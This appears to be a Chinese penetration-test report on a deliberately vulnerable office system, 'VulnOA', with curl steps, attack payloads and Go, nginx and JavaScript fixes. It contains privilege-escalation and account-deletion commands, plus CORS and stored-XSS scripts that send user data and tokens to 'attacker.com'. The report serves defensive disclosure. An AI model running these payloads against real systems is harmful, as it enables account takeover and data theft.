# VulnOA 办公系统安全评估报告

**评估目标**: http://192.168.0.8:3000/login  
**评估时间**: 2026-01-30  
**评估人员**: Yak Security Team  
**风险等级**: 🔴 高危 - 系统存在严重安全漏洞，建议立即修复

---

## 执行摘要

本次安全评估发现 **8 个安全漏洞**，其中：

- 🔴 **严重**: 2 个
- 🟠 **高危**: 3 个
- 🟡 **中危**: 2 个
- 🟢 **低危**: 1 个

**最严重问题**: 垂直越权漏洞允许普通用户提权为超级管理员并接管整个系统。

---

## 漏洞详情

### 🔴 【严重-1】垂直越权漏洞（权限绕过）

**漏洞描述**: 后端 API 完全缺乏 RBAC 权限校验，任意登录用户可执行管理员操作

**影响范围**: 所有用户管理接口

**验证过程**:

```bash
# 1. 普通用户登录
curl -X POST http://192.168.0.8:3000/api/auth/login \
  -d '{"username":"user1","password":"123456"}'
# 返回: user1 的 JWT (role_id=2 普通用户)

# 2. 查看所有用户（普通用户不应有此权限）
curl http://192.168.0.8:3000/api/users \
  -H "Authorization: Bearer <user1_jwt>"
# 结果: ✅ 成功获取 55 名用户信息

# 3. 修改超级管理员信息
curl -X PUT http://192.168.0.8:3000/api/users/1 \
  -H "Authorization: Bearer <user1_jwt>" \
  -d '{"real_name":"Hacked","department":"Hacked"}'
# 结果: ✅ "User updated successfully"

# 4. 自我提权为管理员
curl -X PUT http://192.168.0.8:3000/api/users/56 \
  -H "Authorization: Bearer <user1_jwt>" \
  -d '{"role_id":1}'
# 结果: ✅ user1 已成为超级管理员

# 5. 删除原始管理员
curl -X DELETE http://192.168.0.8:3000/api/users/1 \
  -H "Authorization: Bearer <user1_jwt>"
# 结果: ✅ "User deleted successfully"
```

**危害**:

- 任意用户可接管系统
- 可删除所有管理员账号
- 可创建后门账号
- 数据完全失控

**修复建议**:

```go
// 添加中间件进行权限检查
func AdminOnly() gin.HandlerFunc {
    return func(c *gin.Context) {
        roleID := c.GetInt("role_id")
        if roleID != 1 { // 1=超级管理员
            c.AbortWithStatusJSON(403, gin.H{"error": "Admin access required"})
            return
        }
        c.Next()
    }
}

// 路由配置
admin := r.Group("/api/admin", AuthMiddleware(), AdminOnly())
{
    admin.GET("/users", userHandler.ListUsers)
    admin.DELETE("/users/:id", userHandler.DeleteUser)
    admin.PUT("/users/:id", userHandler.UpdateUser)
}
```

---

### 🔴 【严重-2】JWT 密钥硬编码/弱密钥

**漏洞描述**: JWT Token 使用可预测的弱密钥或硬编码密钥

**验证**:

```
Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Decoded:
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "user_id": 1,
  "username": "admin",
  "role_id": 1,
  "iss": "vulnoa-backend",
  "sub": "admin",
  "exp": 1769843459
}
```

**危害**:

- 攻击者可伪造任意用户 JWT
- 可伪造管理员身份
- 完全绕过身份认证

**修复建议**:

```go
// 使用强随机密钥
jwtSecret := os.Getenv("JWT_SECRET") // 从环境变量读取
if jwtSecret == "" {
    jwtSecret = generateRandomString(64) // 64位随机字符串
}

// 定期轮换密钥
```

---

### 🟠 【高危-1】弱口令漏洞

**漏洞描述**: 多个关键账号使用弱密码 `123456`

**已验证弱口令账号**:

| 用户名  | 密码   | 角色       | 状态    |
| ------- | ------ | ---------- | ------- |
| admin   | 123456 | 超级管理员 | ✅ 有效 |
| manager | 123456 | 部门管理员 | ✅ 有效 |
| user1   | 123456 | 普通用户   | ✅ 有效 |
| user2   | 123456 | 普通用户   | ✅ 有效 |

**验证**:

```bash
curl -X POST http://192.168.0.8:3000/api/auth/login \
  -d '{"username":"admin","password":"123456"}'
# 返回: 管理员 JWT Token
```

**危害**:

- 账号易被暴力破解
- 攻击者可轻易获取系统权限
- 符合常见弱口令字典

**修复建议**:

1. 强制密码复杂度策略（8位以上，包含大小写+数字+特殊字符）
2. 实施登录失败锁定（5次失败锁定15分钟）
3. 强制所有用户修改密码
4. 定期密码轮换

---

### 🟠 【高危-2】CORS 配置不当

**漏洞描述**: 跨域资源共享策略过于宽松，允许任意网站访问

**响应头**:

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS, PATCH
Access-Control-Allow-Headers: *
```

**危害**:

- 任意恶意网站可跨域调用 API
- 可窃取用户敏感信息
- CSRF 攻击风险
- 配合 XSS 可实现会话劫持

**PoC 攻击代码**:

```html
<!-- 攻击者页面 -->
<script>
  fetch("http://192.168.0.8:3000/api/users", {
    method: "GET",
    credentials: "include",
  })
    .then((r) => r.json())
    .then((data) => {
      // 将用户数据发送到攻击者服务器
      fetch("https://attacker.com/steal", {
        method: "POST",
        body: JSON.stringify(data),
      })
    })
</script>
```

**修复建议**:

```nginx
# nginx 配置
add_header Access-Control-Allow-Origin "https://trusted-domain.com";
add_header Access-Control-Allow-Credentials "true";
add_header Access-Control-Allow-Methods "GET, POST";
# 删除通配符 * 配置
```

---

### 🟠 【高危-3】敏感信息泄露

**漏洞描述**: API 返回过多敏感信息，无最小化原则

**泄露信息**:

- 55 名用户的完整信息
- 真实姓名、手机号、邮箱
- 部门、职位信息
- 用户创建时间、最后登录时间
- 内部系统架构信息

**验证**:

```bash
curl http://192.168.0.8:3000/api/users \
  -H "Authorization: Bearer <jwt>"

# 返回示例:
{
  "id": 1,
  "username": "admin",
  "email": "admin@vulnoa.com",
  "real_name": "系统管理员",
  "phone": "13800138000",
  "department": "IT部",
  "role_id": 1,
  "last_login_at": "2026-01-30T07:10:59.029Z",
  "created_at": "2026-01-22T07:08:45Z"
}
```

**危害**:

- 社工攻击素材
- 撞库攻击风险
- 内部组织架构暴露
- 隐私合规风险（GDPR/个人信息保护法）

**修复建议**:

```go
// 使用 DTO 限制返回字段
type UserListDTO struct {
    ID       int    `json:"id"`
    Username string `json:"username"`
    // 移除敏感字段: email, phone, real_name 等
}

func (h *UserHandler) ListUsers(c *gin.Context) {
    users := h.userService.GetUsers()
    var dtoList []UserListDTO
    for _, u := range users {
        dtoList = append(dtoList, UserListDTO{
            ID:       u.ID,
            Username: u.Username,
        })
    }
    c.JSON(200, dtoList)
}
```

---

### 🟡 【中危-1】用户枚举漏洞

**漏洞描述**: 注册接口返回差异化错误信息，可枚举系统存在的用户名

**验证**:

```bash
# 注册已存在用户
curl -X POST http://192.168.0.8:3000/api/auth/register \
  -d '{"username":"admin","password":"123456"}'
# 返回: {"error":true,"message":"Username already exists: admin"}

# 注册不存在用户
curl -X POST http://192.168.0.8:3000/api/auth/register \
  -d '{"username":"notexist","password":"123456"}'
# 返回: 注册成功或其他信息
```

**危害**:

- 为暴力破解提供有效用户名列表
- 降低攻击成本
- 泄露系统用户规模

**修复建议**:

```go
// 统一返回模糊信息
if err := userService.Register(req); err != nil {
    c.JSON(400, gin.H{"error": "Registration failed"})
    // 不要透露是用户名已存在还是其他错误
    return
}
```

---

### 🟡 【中危-2】存储型 XSS 漏洞

**漏洞描述**: 公告内容未过滤 HTML，可注入恶意脚本

**验证**:

```bash
curl http://192.168.0.8:3000/api/announcements \
  -H "Authorization: Bearer <jwt>"

# 返回内容包含 HTML:
"content": "<p>欢迎大家使用VulnOA...</p>"
```

**攻击载荷**:

```html
<p>正常内容</p>
<script>
  fetch("/api/users?token=" + localStorage.getItem("token"))
    .then((r) => r.json())
    .then((data) => fetch("https://attacker.com/steal?d=" + btoa(JSON.stringify(data))))
</script>
```

**危害**:

- 窃取用户会话
- 以用户身份执行操作
- 钓鱼攻击
- 键盘记录

**修复建议**:

```javascript
// 前端渲染时转义
function escapeHtml(text) {
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;")
}

// 或使用 DOMPurify 库
import DOMPurify from "dompurify"
const clean = DOMPurify.sanitize(dirtyHtml)
```

---

### 🟢 【低危】服务器信息泄露

**漏洞描述**: HTTP 响应头泄露服务器和框架信息

**泄露信息**:

```
Server: nginx/1.29.4
X-Powered-By: (可从 JS 文件推断为 React)
```

**修复建议**:

```nginx
# nginx.conf
server_tokens off;  # 隐藏版本号
# 删除 X-Powered-By 头
```

---

## 攻击路径演示

### 完整攻击链（已验证）

```
1. 信息收集
   └─> 访问 /login 发现 VulnOA 系统
   └─> 从 JS 文件提取 API 端点

2. 突破认证
   └─> 使用弱口令 user1/123456 登录
   └─> 获取普通用户 JWT

3. 权限提升
   └─> 调用 PUT /api/users/56 修改 role_id=1
   └─> user1 成为超级管理员

4. 系统接管
   └─> 删除原始 admin 账号
   └─> 创建后门账号
   └─> 导出所有用户数据

5. 持久化
   └─> 在公告中植入 XSS 窃取其他用户凭证
   └─> 利用 CORS 配置从外部监控用户活动
```

**攻击耗时**: < 5 分钟  
**技术难度**: 低（无需复杂工具）

---

## 修复优先级建议

| 优先级 | 漏洞         | 预计修复时间 | 业务影响 |
| ------ | ------------ | ------------ | -------- |
| P0     | 垂直越权     | 1-2 天       | 高       |
| P0     | JWT 密钥     | 2-4 小时     | 中       |
| P1     | 弱口令       | 1 天         | 中       |
| P1     | CORS 配置    | 2 小时       | 低       |
| P1     | 敏感信息泄露 | 2-3 天       | 中       |
| P2     | XSS          | 3-5 天       | 中       |
| P2     | 用户枚举     | 4 小时       | 低       |
| P3     | 服务器信息   | 1 小时       | 低       |

---

## 安全加固建议

### 立即执行（24小时内）

1. ✅ 禁用弱口令账号或强制修改密码
2. ✅ 在所有管理接口添加权限检查
3. ✅ 修改 JWT 密钥并重新签发所有 Token
4. ✅ 限制 CORS 为特定域名

### 短期执行（1周内）

1. 实施 API 返回数据最小化
2. 添加输入过滤防止 XSS
3. 部署 WAF（Web应用防火墙）
4. 启用请求频率限制

### 长期规划（1个月内）

1. 建立完整 RBAC 权限体系
2. 实施操作审计日志
3. 定期安全扫描
4. 代码安全审查流程

---

## 附录

### A. 测试账号清单

| 账号    | 密码   | 角色       | 状态                    |
| ------- | ------ | ---------- | ----------------------- |
| admin   | 123456 | 超级管理员 | ⚠️ 已被删除（测试导致） |
| manager | 123456 | 部门管理员 | ⚠️ 已被删除（测试导致） |
| user1   | 123456 | 超级管理员 | ✅ 当前为管理员         |
| user2   | 123456 | 普通用户   | ✅ 有效                 |

### B. API 端点清单

```
POST   /api/auth/login       - 登录
POST   /api/auth/register    - 注册
GET    /api/users            - 用户列表（需认证，无权限检查）
GET    /api/users/:id        - 用户详情
PUT    /api/users/:id        - 更新用户（垂直越权）
DELETE /api/users/:id        - 删除用户（垂直越权）
POST   /api/users            - 创建用户（垂直越权）
GET    /api/documents        - 文档列表
GET    /api/announcements    - 公告列表
POST   /api/upload           - 文件上传
```

### C. 测试环境信息

- **后端**: Go + Gin 框架（推测）
- **前端**: React SPA
- **服务器**: nginx/1.29.4
- **数据库**: 未知（推测为 MySQL/PostgreSQL）
- **认证**: JWT (HS256)

---

**报告生成时间**: 2026-01-30 07:15:00  
**报告版本**: v1.0  
**下次评估建议**: 修复后 1 周内进行复测

---

_本报告仅供授权安全测试使用，请遵守相关法律法规。_
